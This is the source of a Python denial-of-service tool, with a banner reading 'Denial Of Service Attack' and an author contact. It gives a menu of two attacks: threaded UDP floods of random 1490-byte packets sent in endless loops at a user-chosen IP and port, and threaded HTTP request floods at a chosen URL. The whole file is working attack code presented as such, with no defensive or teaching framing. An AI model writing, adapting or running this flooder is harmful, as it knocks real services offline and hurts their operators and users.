import os, sys, socket, random, threading, requests
# from concurrent.futures import ThreadPoolExecutor


def clr():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print("""
 ██████╗░░█████╗░░██████╗░█████╗░
 ██╔══██╗██╔══██╗██╔════╝██╔══██╗
 ██║░░██║██║░░██║╚█████╗░███████║
 ██║░░██║██║░░██║░╚═══██╗██╔══██║
 ██████╔╝╚█████╔╝██████╔╝██║░░██║
 ╚═════╝░░╚════╝░╚═════╝░╚═╝░░╚═╝

 Denial Of Service Attack

 Coder By : https://github.com/Nux-xader
 Contact  : https://wa.me/6281251389915
 Version  : 1.0.0
 __________________________________________________
""")


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
def send_packet(bytes, ip_addr, port):
	while True:
		try:
			sock.sendto(bytes, (ip_addr, port))
			print(f" [+] Sent packet to {ip_addr} throught port: {port}")
		except:
			break


def send_reqs(url):
	requests.get(url)
	print(f" [+] Send request to {url}")


def main():
	clr()
	banner()
	print(" Menu :\n [1] Bandwitch flooding\n [2] Requests flooding (only for Web service)")
	while True:
		choice = str(input(" [*] Select menu : "))
		if choice == "1":
			bytes = random._urandom(1490)

			ip_addr = input(" [*] IP Address : ")
			while True:
				try:
					port = int(input(" [*] Port (e.g: 80) :  "))
					thrd = int(input(" [*] Thread : "))
					break
				except:
					print("\n [!] Invalid input")
			clr()
			banner()
			print(" [+] Status : Attacking")
			task = [threading.Thread(target=send_packet, args=(bytes, ip_addr, port))  for i in range(thrd)]
			[i.start() for i in task]
			[i.join() for i in task]
			# with ThreadPoolExecutor(max_workers=thrd) as pool:
			# 	while True:
			# 		pool.submit(send_packet, bytes, ip_addr, port)
			break
		elif choice == "2":
			domain = str(input(" [*] Domain/Url : "))
			while True:
				try:
					thrd = int(input(" [*] Thread : "))
					break
				except:
					print("\n [!] Invalid input")
			clr()
			banner()
			print(" [+] Status : Attacking")
			task = [threading.Thread(target=send_reqs, args=(domain, ))  for i in range(thrd)]
			[i.start() for i in task]
			[i.join() for i in task]

		else:
			print(" [!] Invalid input")
			continue
		break


if __name__ == "__main__":
	try:
		main()
	except(KeyboardInterrupt):
		pass
	except(EOFError):
		pass

	print("\n [+] Bye...")